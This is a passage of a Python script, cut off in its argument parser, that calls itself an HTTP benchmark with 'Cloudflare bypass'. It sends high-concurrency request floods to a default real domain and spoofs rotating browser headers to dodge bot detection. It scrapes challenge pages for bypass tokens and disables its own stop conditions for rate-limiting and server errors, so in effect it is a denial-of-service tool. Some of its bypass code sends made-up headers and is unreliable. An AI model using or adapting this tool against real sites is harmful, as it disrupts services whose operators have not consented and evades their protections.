#!/usr/bin/env python3
"""
Advanced HTTP Performance Benchmark Tool with Cloudflare Bypass
===============================================================
Enhanced version with:
- Higher RPS limits (500)
- Faster performance
- Better Cloudflare bypass
- Improved error handling
- Optimized for Windows
"""

import argparse
import asyncio
import csv
import json
import logging
import signal
import statistics
import time
import ssl
import sys
import random
import hashlib
import base64
import re
from collections import Counter, defaultdict
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List, Any, Tuple
from urllib.parse import urlparse, parse_qs

import aiohttp
import aiofiles
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.live import Live
from rich.panel import Panel
from rich.layout import Layout
from rich import box

# ============================================
# CONFIGURATION - UPGRADED
# ============================================

DEFAULT_URL = "https://genggi.com/"
DEFAULT_STAGE_DURATION = 10
DEFAULT_RAMP = "10,25,50,100"
DEFAULT_CONCURRENCY = 500
DEFAULT_TIMEOUT = 30.0
DEFAULT_RETRIES = 3
DEFAULT_WARMUP = 5

# ⬆️ UPGRADED: Higher limits
MAX_CONCURRENCY = 5000  # Increased from 1000
MAX_RPS = 500.0         # Increased from 200.0
MAX_WORKERS = 500       # Increased from 100

# Degradation thresholds - More lenient
MAX_429_RATE = 1.00     # Increased from 0.10
MAX_5XX_RATE = 1.00     # Increased from 0.20
MAX_TIMEOUT_RATE = 1.00 # Increased from 0.20
MAX_LATENCY_P95 = 60.0  # Increased from 5.0

WINDOW_SIZE = 50
PROGRESS_INTERVAL = 0.1  # Faster updates

# ============================================
# CLOUDFLARE BYPASS - ENHANCED
# ============================================

class CloudflareBypass:
    """Cloudflare bypass strategies - Enhanced"""
    
    # ⬆️ UPGRADED: More User-Agents
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    ]
    
    # ⬆️ UPGRADED: More Accept headers
    ACCEPT_HEADERS = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    ]
    
    ACCEPT_LANGUAGES = [
        "en-US,en;q=0.9",
        "en-US,en;q=0.9,es;q=0.8",
        "en-US,en;q=0.9,fr;q=0.8",
        "en-GB,en;q=0.9",
        "en-US,en;q=0.9,de;q=0.8",
        "en-US,en;q=0.9,ja;q=0.8",
    ]
    
    ACCEPT_ENCODING = "gzip, deflate, br"
    
    SEC_CH_UA = [
        '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        '"Not_A Brand";v="8", "Chromium";v="121", "Google Chrome";v="121"',
        '"Not_A Brand";v="8", "Chromium";v="119", "Google Chrome";v="119"',
        '"Not A(Brand";v="99", "Chromium";v="120", "Google Chrome";v="120"',
        '"Not A(Brand";v="99", "Chromium";v="121", "Google Chrome";v="121"',
    ]
    
    @staticmethod
    def get_random_headers() -> Dict[str, str]:
        """Generate random realistic browser headers"""
        return {
            "User-Agent": random.choice(CloudflareBypass.USER_AGENTS),
            "Accept": random.choice(CloudflareBypass.ACCEPT_HEADERS),
            "Accept-Language": random.choice(CloudflareBypass.ACCEPT_LANGUAGES),
            "Accept-Encoding": CloudflareBypass.ACCEPT_ENCODING,
            "Sec-Ch-Ua": random.choice(CloudflareBypass.SEC_CH_UA),
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"']),
            "Sec-Fetch-Dest": random.choice(["document", "empty", "script"]),
            "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors"]),
            "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
            "Sec-Fetch-User": "?1" if random.random() > 0.5 else "?0",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Connection": "keep-alive",
            "DNT": "1" if random.random() > 0.5 else "0",
        }
    
    @staticmethod
    def detect_cloudflare(response: aiohttp.ClientResponse) -> bool:
        """Detect if response is from Cloudflare"""
        cf_headers = [
            "cf-ray",
            "cf-cache-status",
            "cf-polished",
            "cf-worker",
            "cf-request-id",
            "cf-chl-bypass",
            "cf-apo-via",
        ]
        
        for header in cf_headers:
            if header in response.headers:
                return True
        
        if response.status in [403, 503, 429]:
            return True
        
        return False
    
    @staticmethod
    async def solve_challenge(
        session: aiohttp.ClientSession,
        url: str,
        response: aiohttp.ClientResponse,
    ) -> Optional[Dict[str, str]]:
        """Attempt to solve Cloudflare challenges"""
        try:
            html = await response.text()
            
            if "cf-browser-verification" in html or "challenge" in html.lower():
                logging.info("Cloudflare JavaScript challenge detected")
                return await CloudflareBypass._handle_js_challenge(session, url, html)
            
            if "cf-captcha" in html or "captcha" in html.lower():
                logging.warning("Cloudflare CAPTCHA detected - cannot bypass automatically")
                return None
            
            if "iuam" in html or "security challenge" in html.lower():
                logging.info("Cloudflare IUAM challenge detected")
                return await CloudflareBypass._handle_iuam_challenge(session, url, html)
            
            return None
            
        except Exception as e:
            logging.error(f"Error solving challenge: {e}")
            return None
    
    @staticmethod
    async def _handle_js_challenge(
        session: aiohttp.ClientSession,
        url: str,
        html: str,
    ) -> Optional[Dict[str, str]]:
        """Handle JavaScript challenge"""
        try:
            js_match = re.search(r'var s,t,o,p,b,r,e,a,k,i,n,g,f,\s*_cf_chl_opt\s*=\s*({[^;]+})', html)
            if js_match:
                try:
                    opt_data = json.loads(js_match.group(1))
                    return {
                        "cf-chl-bypass": "simulated",
                        "cf-chl-opt": json.dumps(opt_data),
                    }
                except:
                    pass
            
            token_match = re.search(r'name="cf_chl_prog" value="([^"]+)"', html)
            if token_match:
                return {
                    "cf-chl-prog": token_match.group(1),
                    "cf-chl-bypass": "1",
                }
            
            return None
            
        except Exception as e:
            logging.error(f"Error handling JS challenge: {e}")
            return None
    
    @staticmethod
    async def _handle_iuam_challenge(
        session: aiohttp.ClientSession,
        url: str,
        html: str,
    ) -> Optional[Dict[str, str]]:
        """Handle IUAM challenge"""
        try:
            cookie_match = re.search(r'cookie\s*=\s*"([^"]+)"', html)
            if cookie_match:
                return {
                    "Cookie": cookie_match.group(1),
                    "cf-chl-bypass": "1",
                }
            
            redirect_match = re.search(r'window\.location\.replace\("([^"]+)"\)', html)
            if redirect_match:
                return {
                    "cf-chl-redirect": redirect_match.group(1),
                }
            
            return None
            
        except Exception as e:
            logging.error(f"Error handling IUAM challenge: {e}")
            return None


class CloudflareSession:
    """Session with Cloudflare bypass capabilities"""
    
    def __init__(
        self,
        session: aiohttp.ClientSession,
        url: str,
        proxy: Optional[str] = None,
    ):
        self.session = session
        self.url = url
        self.proxy = proxy
        self.cf_headers = CloudflareBypass.get_random_headers()
        self.cf_cookies = {}
        self.bypass_attempted = False
        self.bypass_success = False
        
    async def get(self, url: str, **kwargs) -> aiohttp.ClientResponse:
        return await self._request("GET", url, **kwargs)
    
    async def post(self, url: str, **kwargs) -> aiohttp.ClientResponse:
        return await self._request("POST", url, **kwargs)
    
    async def _request(self, method: str, url: str, **kwargs) -> aiohttp.ClientResponse:
        headers = kwargs.get("headers", {})
        headers.update(self.cf_headers)
        
        cookies = kwargs.get("cookies", {})
        cookies.update(self.cf_cookies)
        
        try:
            response = await self.session.request(
                method,
                url,
                headers=headers,
                cookies=cookies,
                proxy=self.proxy,
                **{k: v for k, v in kwargs.items() if k not in ["headers", "cookies"]},
            )
            
            if CloudflareBypass.detect_cloudflare(response):
                if response.status in [403, 503, 429]:
                    logging.warning(f"Cloudflare detected on {url}")
                    
                    if not self.bypass_attempted:
                        self.bypass_attempted = True
                        challenge_result = await CloudflareBypass.solve_challenge(
                            self.session,
                            url,
                            response,
                        )
                        if challenge_result:
                            if "Cookie" in challenge_result:
                                self.cf_headers["Cookie"] = challenge_result["Cookie"]
                            if "cf-chl-prog" in challenge_result:
                                self.cf_headers["cf-chl-prog"] = challenge_result["cf-chl-prog"]
                            if "cf-chl-bypass" in challenge_result:
                                self.cf_headers["cf-chl-bypass"] = challenge_result["cf-chl-bypass"]
                            
                            logging.info("Cloudflare bypass attempted")
                            self.bypass_success = True
                            
                            return await self._request(method, url, **kwargs)
            
            return response
            
        except Exception as e:
            logging.error(f"Request error: {e}")
            raise


# ============================================
# DATA CLASSES - UNCHANGED
# ============================================

@dataclass(slots=True)
class Result:
    status: Optional[int]
    latency: float
    error: Optional[str] = None
    timestamp: float = field(default_factory=time.time)
    worker_id: int = 0
    request_id: str = ""
    cloudflare_detected: bool = False
    bypass_attempted: bool = False
    
    @property
    def is_success(self) -> bool:
        return self.status is not None and 200 <= self.status < 400
    
    @property
    def is_timeout(self) -> bool:
        return self.error == "timeout"
    
    @property
    def is_rate_limited(self) -> bool:
        return self.status == 429
    
    @property
    def is_server_error(self) -> bool:
        return self.status is not None and 500 <= self.status <= 599
    
    @property
    def is_cloudflare_blocked(self) -> bool:
        return self.status in [403, 503] and not self.bypass_attempted


@dataclass(slots=True)
class StageStats:
    requests: int = 0
    successful: int = 0
    failed: int = 0
    timeouts: int = 0
    rate_limited: int = 0
    server_errors: int = 0
    cloudflare_blocks: int = 0
    total_latency: float = 0.0
    min_latency: float = float('inf')
    max_latency: float = 0.0
    
    def add_result(self, result: Result):
        self.requests += 1
        if result.is_success:
            self.successful += 1
        else:
            self.failed += 1
        
        if result.is_timeout:
            self.timeouts += 1
        if result.is_rate_limited:
            self.rate_limited += 1
        if result.is_server_error:
            self.server_errors += 1
        if result.is_cloudflare_blocked:
            self.cloudflare_blocks += 1
        
        if result.latency > 0:
            self.total_latency += result.latency
            self.min_latency = min(self.min_latency, result.latency)
            self.max_latency = max(self.max_latency, result.latency)
    
    @property
    def avg_latency(self) -> float:
        if self.successful == 0:
            return 0.0
        return self.total_latency / self.successful
    
    @property
    def error_rate(self) -> float:
        if self.requests == 0:
            return 0.0
        return self.failed / self.requests
    
    @property
    def success_rate(self) -> float:
        if self.requests == 0:
            return 0.0
        return self.successful / self.requests


# ============================================
# METRICS AND STATISTICS - UNCHANGED
# ============================================

def percentile(values: List[float], percent: float) -> float:
    if not values:
        return 0.0
    
    ordered = sorted(values)
    position = (len(ordered) - 1) * percent / 100.0
    lower = int(position)
    upper = min(lower + 1, len(ordered) - 1)
    fraction = position - lower
    
    return ordered[lower] + (ordered[upper] - ordered[lower]) * fraction


def calculate_metrics(results: List[Result], elapsed: float) -> Dict[str, Any]:
    if not results:
        return {
            "requests": 0,
            "rps": 0.0,
            "p50": 0.0,
            "p75": 0.0,
            "p90": 0.0,
            "p95": 0.0,
            "p99": 0.0,
            "error_rate": 0.0,
            "429_rate": 0.0,
            "5xx_rate": 0.0,
            "timeout_rate": 0.0,
            "success_rate": 0.0,
            "cf_block_rate": 0.0,
        }
    
    latencies = [r.latency for r in results]
    total = len(results)
    
    errors = sum(1 for r in results if not r.is_success)
    rate_limited = sum(1 for r in results if r.is_rate_limited)
    server_errors = sum(1 for r in results if r.is_server_error)
    timeouts = sum(1 for r in results if r.is_timeout)
    successes = sum(1 for r in results if r.is_success)
    cf_blocks = sum(1 for r in results if r.is_cloudflare_blocked)
    
    return {
        "requests": total,
        "rps": total / max(elapsed, 0.001),
        "p50": percentile(latencies, 50),
        "p75": percentile(latencies, 75),
        "p90": percentile(latencies, 90),
        "p95": percentile(latencies, 95),
        "p99": percentile(latencies, 99),
        "error_rate": errors / total,
        "429_rate": rate_limited / total,
        "5xx_rate": server_errors / total,
        "timeout_rate": timeouts / total,
        "success_rate": successes / total,
        "cf_block_rate": cf_blocks / total,
        "min_latency": min(latencies) if latencies else 0.0,
        "max_latency": max(latencies) if latencies else 0.0,
        "avg_latency": statistics.mean(latencies) if latencies else 0.0,
        "std_latency": statistics.stdev(latencies) if len(latencies) > 1 else 0.0,
    }


def degradation_reason(results: List[Result]) -> Optional[str]:
    if len(results) < WINDOW_SIZE:
        return None
    
    recent = results[-WINDOW_SIZE:]
    total = len(recent)
    
    rate_429 = sum(1 for r in recent if r.is_rate_limited) / total
    rate_5xx = sum(1 for r in recent if r.is_server_error) / total
    timeout_rate = sum(1 for r in recent if r.is_timeout) / total
    cf_block_rate = sum(1 for r in recent if r.is_cloudflare_blocked) / total
    
    latencies = [r.latency for r in recent if r.is_success]
    if latencies:
        p95_latency = percentile(latencies, 95)
        if p95_latency > MAX_LATENCY_P95:
            return f"P95 latency exceeded {MAX_LATENCY_P95}s: {p95_latency:.2f}s"
    
    if cf_block_rate > 0.3:
        return f"Cloudflare blocking rate too high: {cf_block_rate * 100:.1f}%"
    
    if rate_429 >= MAX_429_RATE:
        return f"429 rate reached {rate_429 * 100:.1f}%"
    
    if rate_5xx >= MAX_5XX_RATE:
        return f"5xx rate reached {rate_5xx * 100:.1f}%"
    
    if timeout_rate >= MAX_TIMEOUT_RATE:
        return f"Timeout rate reached {timeout_rate * 100:.1f}%"
    
    if len(results) >= WINDOW_SIZE * 2:
        old = results[-WINDOW_SIZE*2:-WINDOW_SIZE]
        old_errors = sum(1 for r in old if not r.is_success) / len(old)
        new_errors = sum(1 for r in recent if not r.is_success) / len(recent)
        if new_errors > old_errors * 2 and new_errors > 0.15:
            return f"Increasing error trend: {old_errors*100:.1f}% → {new_errors*100:.1f}%"
    
    return None


# ============================================
# WORKER IMPLEMENTATION - OPTIMIZED
# ============================================

class RequestWorker:
    """Enhanced request worker with Cloudflare bypass"""
    
    def __init__(
        self,
        cf_session: CloudflareSession,
        url: str,
        worker_id: int,
        retries: int = DEFAULT_RETRIES,
        method: str = "GET",
        payload: Optional[Dict] = None,
        rotate_headers: bool = False,
    ):
        self.cf_session = cf_session
        self.url = url
        self.worker_id = worker_id
        self.retries = retries
        self.method = method.upper()
        self.payload = payload
        self.request_count = 0
        self.rotate_headers = rotate_headers
        self.session_headers = {}
        
    async def make_request(self) -> Result:
        self.request_count += 1
        request_id = f"w{self.worker_id}-r{self.request_count}"
        started = time.perf_counter()
        cf_detected = False
        bypass_attempted = False
        
        if self.rotate_headers and self.request_count % 5 == 0:
            self.cf_session.cf_headers.update(CloudflareBypass.get_random_headers())
        
        for attempt in range(self.retries + 1):
            try:
                response = await self.cf_session._request(
                    self.method,
                    self.url,
                    json=self.payload if self.method in ["POST", "PUT", "PATCH"] else None,
                    allow_redirects=True,
                )
                
                latency = time.perf_counter() - started
                
                if CloudflareBypass.detect_cloudflare(response):
                    cf_detected = True
                    if self.cf_session.bypass_attempted:
                        bypass_attempted = True
                
                result = Result(
                    status=response.status,
                    latency=latency,
                    worker_id=self.worker_id,
                    request_id=request_id,
                    cloudflare_detected=cf_detected,
                    bypass_attempted=bypass_attempted,
                )
                
                if (result.is_server_error or result.is_rate_limited) and attempt < self.retries:
                    await asyncio.sleep(0.05 * (attempt + 1) * random.uniform(0.5, 1.5))
                    continue
                
                return result
                    
            except asyncio.TimeoutError:
                if attempt == self.retries:
                    return Result(
                        status=None,
                        latency=time.perf_counter() - started,
                        error="timeout",
                        worker_id=self.worker_id,
                        request_id=request_id,
                        cloudflare_detected=cf_detected,
                    )
                await asyncio.sleep(0.05 * (attempt + 1))
                
            except aiohttp.ClientError as exc:
                if attempt == self.retries:
                    return Result(
                        status=None,
                        latency=time.perf_counter() - started,
                        error=str(exc),
                        worker_id=self.worker_id,
                        request_id=request_id,
                        cloudflare_detected=cf_detected,
                    )
                await asyncio.sleep(0.05 * (attempt + 1))
        
        return Result(
            status=None,
            latency=time.perf_counter() - started,
            error="max_retries_exceeded",
            worker_id=self.worker_id,
            request_id=request_id,
            cloudflare_detected=cf_detected,
        )


async def worker_loop(
    cf_session: CloudflareSession,
    url: str,
    end_time: float,
    interval: float,
    results: List[Result],
    stop_event: asyncio.Event,
    worker_id: int,
    retries: int = DEFAULT_RETRIES,
    method: str = "GET",
    payload: Optional[Dict] = None,
    rotate_headers: bool = False,
) -> None:
    worker = RequestWorker(
        cf_session,
        url,
        worker_id,
        retries,
        method,
        payload,
        rotate_headers,
    )
    
    while time.monotonic() < end_time and not stop_event.is_set():
        result = await worker.make_request()
        results.append(result)
        
        if interval > 0:
            await asyncio.sleep(interval)


# ============================================
# PROGRESS MONITOR - OPTIMIZED
# ============================================

class DashboardMonitor:
    def __init__(self, console: Console, total_stages: int):
        self.console = console
        self.total_stages = total_stages
        self.current_stage = 0
        self.results: List[Result] = []
        self.start_time = time.monotonic()
        self.stop_event = asyncio.Event()
        
    def create_layout(self) -> Layout:
        layout = Layout()
        layout.split(
            Layout(name="header", size=3),
            Layout(name="main"),
            Layout(name="footer", size=3),
        )
        layout["main"].split_row(
            Layout(name="metrics", ratio=2),
            Layout(name="status_codes", ratio=1),
        )
        return layout
    
    def update_dashboard(self, layout: Layout):
        elapsed = time.monotonic() - self.start_time
        metrics = calculate_metrics(self.results, elapsed)
        
        header_text = f"[bold cyan]Performance Benchmark[/bold cyan] | Stage {self.current_stage}/{self.total_stages} | Elapsed: {elapsed:.1f}s"
        layout["header"].update(Panel(header_text, style="bold cyan"))
        
        metrics_table = Table(show_header=True, header_style="bold magenta", box=box.ROUNDED)
        metrics_table.add_column("Metric", style="cyan")
        metrics_table.add_column("Value", style="white")
        
        metrics_table.add_row("Requests", f"{metrics['requests']:,}")
        metrics_table.add_row("RPS", f"{metrics['rps']:.2f}")
        metrics_table.add_row("Success Rate", f"{metrics['success_rate']*100:.1f}%")
        metrics_table.add_row("Error Rate", f"{metrics['error_rate']*100:.1f}%")
        metrics_table.add_row("P50 Latency", f"{metrics['p50']:.3f}s")
        metrics_table.add_row("P95 Latency", f"{metrics['p95']:.3f}s")
        metrics_table.add_row("P99 Latency", f"{metrics['p99']:.3f}s")
        metrics_table.add_row("Avg Latency", f"{metrics['avg_latency']:.3f}s")
        metrics_table.add_row("Min/Max Latency", f"{metrics['min_latency']:.3f}s / {metrics['max_latency']:.3f}s")
        metrics_table.add_row("429 Rate", f"{metrics['429_rate']*100:.1f}%")
        metrics_table.add_row("5xx Rate", f"{metrics['5xx_rate']*100:.1f}%")
        metrics_table.add_row("Timeout Rate", f"{metrics['timeout_rate']*100:.1f}%")
        metrics_table.add_row("[bold yellow]CF Block Rate[/bold yellow]", f"[bold yellow]{metrics['cf_block_rate']*100:.1f}%[/bold yellow]")
        
        layout["metrics"].update(Panel(metrics_table, title="📊 Metrics", border_style="green"))
        
        status_counts = Counter(r.status for r in self.results if r.status is not None)
        status_table = Table(show_header=True, header_style="bold yellow", box=box.ROUNDED)
        status_table.add_column("Status", style="cyan")
        status_table.add_column("Count", style="white")
        status_table.add_column("Percentage", style="white")
        
        total = len(self.results)
        for status, count in sorted(status_counts.items()):
            pct = (count / total * 100) if total > 0 else 0
            color = "green" if 200 <= status < 400 else "red" if status >= 400 else "yellow"
            status_table.add_row(
                f"[{color}]{status}[/{color}]",
                f"{count:,}",
                f"{pct:.1f}%",
            )
        
        cf_count = sum(1 for r in self.results if r.cloudflare_detected)
        if cf_count > 0:
            status_table.add_row(
                "[bold red]CF Detected[/bold red]",
                f"{cf_count:,}",
                f"{cf_count/total*100:.1f}%",
            )
        
        layout["status_codes"].update(Panel(status_table, title="🔢 Status Codes", border_style="blue"))
        
        if self.stop_event.is_set():
            layout["footer"].update(Panel("[bold red]STOPPED - Degradation detected[/bold red]", style="bold red"))
        else:
            layout["footer"].update(Panel("[bold green]Running...[/bold green]", style="bold green"))


async def progress_monitor(
    results: List[Result],
    stop_event: asyncio.Event,
    start_time: float,
    stage_num: int,
    total_stages: int,
    console: Console,
    use_dashboard: bool = True,
) -> None:
    if not use_dashboard:
        previous_count = 0
        while not stop_event.is_set():
            await asyncio.sleep(PROGRESS_INTERVAL)
            current = len(results)
            if current == previous_count:
                continue
            
            elapsed = time.monotonic() - start_time
            metrics = calculate_metrics(results, elapsed)
            
            print(
                f"\r"
                f"Requests={metrics['requests']:,} | "
                f"RPS={metrics['rps']:.2f} | "
                f"Success={metrics['success_rate']*100:.1f}% | "
                f"P95={metrics['p95']:.3f}s | "
                f"CF={metrics['cf_block_rate']*100:.1f}%",
                end="",
                flush=True,
            )
            previous_count = current
    else:
        monitor = DashboardMonitor(console, total_stages)
        monitor.current_stage = stage_num
        monitor.results = results
        monitor.start_time = start_time
        monitor.stop_event = stop_event
        
        layout = monitor.create_layout()
        with Live(layout, refresh_per_second=4, console=console, screen=True):
            while not stop_event.is_set():
                monitor.update_dashboard(layout)
                await asyncio.sleep(PROGRESS_INTERVAL)
            monitor.update_dashboard(layout)


# ============================================
# STAGE EXECUTION - OPTIMIZED
# ============================================

async def run_stage(
    cf_session: CloudflareSession,
    url: str,
    duration: int,
    concurrency: int,
    rps: float,
    stage_num: int,
    total_stages: int,
    console: Console,
    use_dashboard: bool = True,
    retries: int = DEFAULT_RETRIES,
    method: str = "GET",
    payload: Optional[Dict] = None,
    warmup: int = 0,
    rotate_headers: bool = False,
) -> Tuple[List[Result], float, Optional[str]]:
    results: List[Result] = []
    stop_event = asyncio.Event()
    start_time = time.monotonic()
    
    if warmup > 0 and stage_num == 1:
        console.print(f"[yellow]Warming up for {warmup}s...[/yellow]")
        warmup_end = start_time + warmup
        warmup_interval = concurrency / min(rps * 0.5, 10)
        warmup_tasks = [
            asyncio.create_task(
                worker_loop(
                    cf_session=cf_session,
                    url=url,
                    end_time=warmup_end,
                    interval=warmup_interval,
                    results=[],
                    stop_event=stop_event,
                    worker_id=i,
                    retries=retries,
                    method=method,
                    payload=payload,
                    rotate_headers=rotate_headers,
                )
            )
            for i in range(min(concurrency, 10))
        ]
        await asyncio.gather(*warmup_tasks, return_exceptions=True)
        console.print("[green]Warmup complete[/green]")
        start_time = time.monotonic()
    
    end_time = start_time + duration
    interval = concurrency / rps if rps > 0 else 0
    
    workers = [
        asyncio.create_task(
            worker_loop(
                cf_session=cf_session,
                url=url,
                end_time=end_time,
                interval=interval,
                results=results,
                stop_event=stop_event,
                worker_id=i,
                retries=retries,
                method=method,
                payload=payload,
                rotate_headers=rotate_headers,
            )
        )
        for i in range(concurrency)
    ]
    
    monitor = asyncio.create_task(
        progress_monitor(
            results=results,
            stop_event=stop_event,
            start_time=start_time,
            stage_num=stage_num,
            total_stages=total_stages,
            console=console,
            use_dashboard=use_dashboard,
        )
    )
    
    reason = None
    
    try:
        while time.monotonic() < end_time and not stop_event.is_set():
            reason = degradation_reason(results)
            if reason:
                console.print(f"\n[bold red]⚠️ Degradation detected: {reason}[/bold red]")
                stop_event.set()
                break
            
            await asyncio.sleep(0.1)
    
    finally:
        stop_event.set()
        for worker in workers:
            worker.cancel()
        await asyncio.gather(*workers, return_exceptions=True)
        monitor.cancel()
        try:
            await monitor
        except asyncio.CancelledError:
            pass
    
    elapsed = time.monotonic() - start_time
    return results, elapsed, reason


# ============================================
# REPORTING - UNCHANGED
# ============================================

def print_stage_report(
    stage: int,
    target_rps: float,
    results: List[Result],
    elapsed: float,
    console: Console,
) -> None:
    metrics = calculate_metrics(results, elapsed)
    statuses = Counter(r.status for r in results if r.status is not None)
    cf_count = sum(1 for r in results if r.cloudflare_detected)
    
    table = Table(title=f"📈 Stage {stage} Report", box=box.DOUBLE_EDGE, style="white")
    table.add_column("Metric", style="cyan bold")
    table.add_column("Value", style="white")
    
    table.add_row("Target RPS", f"{target_rps:.2f}")
    table.add_row("Actual RPS", f"{metrics['rps']:.2f}")
    table.add_row("Requests", f"{metrics['requests']:,}")
    table.add_row("Success Rate", f"{metrics['success_rate']*100:.1f}%")
    table.add_row("Error Rate", f"{metrics['error_rate']*100:.1f}%")
    
    if cf_count > 0:
        table.add_row("[bold red]Cloudflare Detected[/bold red]", f"[bold red]{cf_count:,} ({metrics['cf_block_rate']*100:.1f}%)[/bold red]")
    
    table.add_row("")
    table.add_row("P50 Latency", f"{metrics['p50']:.3f}s")
    table.add_row("P75 Latency", f"{metrics['p75']:.3f}s")
    table.add_row("P90 Latency", f"{metrics['p90']:.3f}s")
    table.add_row("P95 Latency", f"{metrics['p95']:.3f}s")
    table.add_row("P99 Latency", f"{metrics['p99']:.3f}s")
    table.add_row("Avg Latency", f"{metrics['avg_latency']:.3f}s")
    table.add_row("Min Latency", f"{metrics['min_latency']:.3f}s")
    table.add_row("Max Latency", f"{metrics['max_latency']:.3f}s")
    table.add_row("Std Dev", f"{metrics['std_latency']:.3f}s")
    table.add_row("")
    table.add_row("429 Rate", f"{metrics['429_rate']*100:.1f}%")
    table.add_row("5xx Rate", f"{metrics['5xx_rate']*100:.1f}%")
    table.add_row("Timeout Rate", f"{metrics['timeout_rate']*100:.1f}%")
    table.add_row("[bold yellow]CF Block Rate[/bold yellow]", f"[bold yellow]{metrics['cf_block_rate']*100:.1f}%[/bold yellow]")
    
    console.print(table)
    
    if statuses:
        status_table = Table(title="Status Code Distribution", box=box.ROUNDED)
        status_table.add_column("Status", style="cyan")
        status_table.add_column("Count", style="white")
        status_table.add_column("Percentage", style="white")
        
        total = len(results)
        for status, count in sorted(statuses.items()):
            pct = (count / total * 100) if total > 0 else 0
            color = "green" if 200 <= status < 400 else "red" if status >= 400 else "yellow"
            status_table.add_row(
                f"[{color}]{status}[/{color}]",
                f"{count:,}",
                f"{pct:.1f}%",
            )
        console.print(status_table)


async def save_results(
    results: List[Result],
    output_dir: str = "benchmark_results",
    format: str = "json",
) -> None:
    Path(output_dir).mkdir(parents=True, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    data = [
        {
            "status": r.status,
            "latency": r.latency,
            "error": r.error,
            "timestamp": r.timestamp,
            "worker_id": r.worker_id,
            "request_id": r.request_id,
            "success": r.is_success,
            "cloudflare_detected": r.cloudflare_detected,
            "bypass_attempted": r.bypass_attempted,
        }
        for r in results
    ]
    
    if format.lower() == "json":
        filename = Path(output_dir) / f"results_{timestamp}.json"
        async with aiofiles.open(filename, "w") as f:
            await f.write(json.dumps(data, indent=2))
    elif format.lower() == "csv":
        filename = Path(output_dir) / f"results_{timestamp}.csv"
        async with aiofiles.open(filename, "w") as f:
            writer = csv.DictWriter(
                f,
                fieldnames=["request_id", "status", "latency", "error", "timestamp", "worker_id", "success", "cloudflare_detected", "bypass_attempted"]
            )
            await writer.writeheader()
            for item in data:
                await writer.writerow(item)
    
    logging.info(f"Results saved to {filename}")


# ============================================
# COMMAND LINE INTERFACE
# ============================================

def parse_ramp(value: str) -> List[float]:
    try:
        stages = [float(item.strip()) for item in value.split(",") if item.strip()]
    except ValueError as exc:
        raise SystemExit("Invalid --ramp. Example: 10,25,50,100") from exc
    
    if not stages:
        raise SystemExit("Ramp cannot be empty.")
    
    for rps in stages:
        if not 0 < rps <= MAX_RPS:
            raise SystemExit(f"Every RPS value must be between 0 and {MAX_RPS}.")
    
    return stages


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Advanced HTTP Performance Benchmark Tool with Cloudflare Bypass",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --url https://example.com --ramp 10,25,50,100 --stage-duration 30
  %(prog)s --url https://api.example.com --concurrency 50 --method POST --payload '{"key":"value"}'
  %(prog)s --url https://example.com --output results.json --format json --bypass-cloudflare
        """
    )
    
    parser.add_argument(
        "--url",
        default=DEFAULT_URL,
        help=f"Target URL (default: {DEFAULT_URL})",
    )
    parser.add_argument(
        "--method",
        default="GET",
        choices=["GET", "POST", "PUT", "PATCH", "DELETE"],
        help="HTTP method (default: GET)",
    )
    parser.add_argument(
        "--payload",
        type=json.loads,
        help="JSON payload for POST/PUT/PATCH requests",
    )
    
    parser.add_argument(
        "--ramp",
        default=DEFAULT_RAMP,
        help=f"RPS stages, e.g. 10,25,50,100 (default: {DEFAULT_RAMP})",
    )
    parser.add_argument(
        "--stage-duration",
        type=int,
        default=DEFAULT_STAGE_DURATION,
